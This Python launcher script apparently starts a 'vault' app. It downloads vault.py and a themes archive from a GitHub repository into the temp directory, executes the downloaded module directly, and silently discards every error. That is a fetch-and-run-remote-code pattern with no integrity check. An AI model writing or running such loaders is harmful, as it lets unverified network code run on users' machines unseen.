import urllib.request
import tempfile
import importlib.util
import os
os.environ["CTK_FORCE_FONT_RENDERING"] = "circle_shapes"

import customtkinter as ctk
import sys
import zipfile
import subprocess

VAULT_URL = "https://raw.githubusercontent.com/ChaoticCrispy/Manager/main/vault.py"
THEMES_ZIP_URL = "https://github.com/ChaoticCrispy/Manager/archive/refs/heads/main.zip"

def ensure_customtkinter():
    try:
        import customtkinter  # noqa: F401
    except ImportError:
        print("[INFO] Installing missing dependency: customtkinter")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "customtkinter"])

def download_file(url, path):
    with urllib.request.urlopen(url) as response:
        with open(path, "wb") as f:
            f.write(response.read())

def extract_themes(zip_path, extract_to):
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(extract_to)
        extracted_root = os.path.join(extract_to, "Manager-main", "themes")
        final_themes = os.path.join(extract_to, "themes")
        if not os.path.exists(final_themes):
            os.rename(extracted_root, final_themes)

def download_and_run():
    try:
        ensure_customtkinter()

        temp_dir = tempfile.gettempdir()
        vault_path = os.path.join(temp_dir, "vault_runtime.py")
        zip_path = os.path.join(temp_dir, "themes.zip")

        download_file(VAULT_URL, vault_path)
        download_file(THEMES_ZIP_URL, zip_path)
        extract_themes(zip_path, temp_dir)

        spec = importlib.util.spec_from_file_location("vault", vault_path)
        vault_module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(vault_module)

    except Exception as e:
        pass

if __name__ == "__main__":
    download_and_run()
